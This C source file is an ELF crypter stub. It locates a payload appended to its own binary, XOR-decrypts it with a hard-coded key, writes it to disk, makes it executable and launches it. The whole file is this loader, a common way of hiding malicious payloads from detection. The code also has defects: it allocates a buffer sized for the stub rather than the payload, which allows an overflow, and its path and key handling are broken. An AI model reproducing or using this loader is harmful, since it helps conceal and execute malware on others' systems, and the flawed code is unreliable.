#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <unistd.h>

#define HEADER_SIZE 64
#define ENC_KEY 0xbaadf00d

char* getFileName(char* szPath)
{
    char* pName = NULL;
    int len = strlen(szPath);
    while(szPath[--len] != '/')
    {
        pName = szPath + len;
    }

    return pName;
}

void xor_crypt(int key, void* pBuffer, int size)
{
    int sa = 0; // shift amount
    void* pEOF = (void*)(((char*)pBuffer) + size);
    char* pByte = 0;
    for(pByte = (char*)pBuffer; pByte < (char*)pEOF; pByte++)
    {
        *pByte ^= (char)(key & (0xFF << (sa*2)));
        sa++;
        if(sa > 4) sa = 0;
    }
}

int main(int argc, char** argv)
{
    printf("Stub...\n");

    // read the header from this file
    char* szFile = NULL;
    szFile = getFileName(argv[0]);
    FILE* pFile = fopen(szFile, "r");
    if(!pFile)
    {
        perror("fopen");
        return  -1;
    }

    Elf64_Ehdr elfHeader;
    fread(&elfHeader, sizeof(elfHeader), 1, pFile);

    printf("Section Header Count: %hd\n"
            "Section Header Size: %hd\n"
            "Section Header Offset: %p\n",
            elfHeader.e_shnum,
            elfHeader.e_shentsize,
            elfHeader.e_shoff);

    Elf64_Shdr secHeader;
    fseek(pFile, 
          elfHeader.e_shoff + ((elfHeader.e_shnum-1) * elfHeader.e_shentsize), 
          SEEK_SET);

    fread(&secHeader, sizeof(secHeader), 1, pFile);

    int stubSize = secHeader.sh_offset + secHeader.sh_size;

    printf("Section Offset: %p\nSection size: %hd\nStub size: %d (bytes)\n", 
            secHeader.sh_offset, 
            secHeader.sh_size,
            stubSize);

    // we need to get the size of the payload
    // we can do this by getting the size of the entire binary
    // and then subtracting the size of the stub from that.
    fseek(pFile, 0, SEEK_END);
    int payloadSize = ftell(pFile) - stubSize;
    
    // read payload from the end of the binary
    void* pPayload = malloc(stubSize);
    fseek(pFile, stubSize, SEEK_SET);
    fread(pPayload, payloadSize, 1, pFile);
    
    // decrypt it
    xor_crypt(ENC_KEY, pPayload, payloadSize);
    
    // write it to disk
    fclose(pFile);
    pFile = fopen("payload", "w");
    if(!pFile)
    {
        perror("fopen");
        return -1;
    }
   
    fwrite(pPayload, payloadSize, 1, pFile);
    fclose(pFile);
   
    // launch it
    pid_t pid = fork();
    if(!pid)
    {
        execlp("chmod", "chmod", "+x", "payload", 0);
        return -1;
    }

    while(wait(NULL) != -1);

    pid = fork();
    if(!pid)
    {
        printf("Launching payload...\n");
        execlp("./payload", "./payload", 0);
        perror("exec");
        return -1;
    }
    while(wait(NULL) != -1);
    return 0;
}
